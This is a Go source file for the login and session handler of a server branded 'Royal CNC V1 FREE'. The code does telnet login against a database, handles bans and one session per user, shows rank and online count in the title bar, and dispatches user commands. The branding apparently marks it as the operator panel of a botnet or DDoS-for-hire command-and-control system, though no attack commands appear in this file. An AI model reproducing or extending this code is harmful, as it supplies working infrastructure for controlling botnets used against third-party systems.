package server

import (
	"fmt"
	"log"
	"net"
	"strings"
	"time"
	"webserver/src/database"
	"webserver/src/server/commands"
	"webserver/src/server/sessions"
	"webserver/src/server/terminal"
)

func RemoveSession(id int64) bool {
	sessions.SessionMutex.Lock()
	delete(sessions.Sessions, id)
	sessions.SessionMutex.Unlock()
	return true
}

func handler(conn net.Conn) {
	conn.Write([]byte(fmt.Sprintf("\033]0;Royal CNC V1 FREE - Login\007")))

	// Consume 64 bytes
	buf := make([]byte, 64)
	_, err := conn.Read(buf)
	if err != nil {
		return
	}
	conn.Write([]byte{255, 251, 1, 255, 251, 3, 255, 252, 34})

	tm := terminal.New(conn)
	fmt.Fprintf(conn, "Username: ")
	user, err := tm.ReadLine("Username# ")
	if err != nil {
		return
	}
	fmt.Fprintf(conn, "Password: ")
	pass, err := tm.ReadPassword("Password# ")
	if err != nil {
		return
	}

	userdata, ok := database.CheckKeyUser(user, pass)
	if !ok {
		fmt.Fprintf(conn, "Invalid Username / Password...\r\n")
		conn.Close()
		return
	}

	if database.CheckBan(userdata.Username) {
		fmt.Fprintf(conn, "Your Account Has Been Suspended / Banned If You Feel This is Wrong Please Contact the Owner\r\n")
		return
	}

	var Session = &sessions.Session{
		ID:   time.Now().Unix(),
		User: userdata,
		Conn: conn,
		Term: tm,
		Chat: false,
	}

	for _, session := range sessions.Sessions {
		if session.User.Username == user {
			fmt.Fprintf(conn, "Session Already Open!")
			log.Printf("%s already has a session open!", session.User.Username)
			return
		}
	}

	sessions.SessionMutex.Lock()
	sessions.Sessions[Session.ID] = Session
	sessions.SessionMutex.Unlock()

	rank := GetRank(Session.User.Rank)

	go func() {
		for {
			time.Sleep(time.Second)
			if _, err := conn.Write([]byte(fmt.Sprintf("\033]0; Royal CNC VFREE - Username [%s] - Online [%d] - Rank [%s]\007", Session.User.Username, sessions.Count(), rank))); err != nil {
				if RemoveSession(Session.ID) {
					log.Printf("%s Session Closed!", Session.User.Username)
				}
				conn.Close()
				break
			}
		}
	}()

	// Clear the screen
	commands.Clear(Session, nil) // Call the Clear function

	// Display the prompt for the user
	for {
		tm.Write([]byte(fmt.Sprintf("%s@RoyalCNC# ", Session.User.Username)))
		cmd, err := tm.ReadLine(fmt.Sprintf("%s@RoyalCNC# ", Session.User.Username))
		if err != nil {
			return
		}
		cmdlist := strings.Split(cmd, " ")
		if !commands.IsCommand(cmdlist[0]) {
			fmt.Fprintf(conn, "Command (%s) is Invalid or disable.\r\n", cmdlist[0])
		} else {
			commands.Commands[cmdlist[0]].Exec(Session, cmdlist)
		}
	}
}
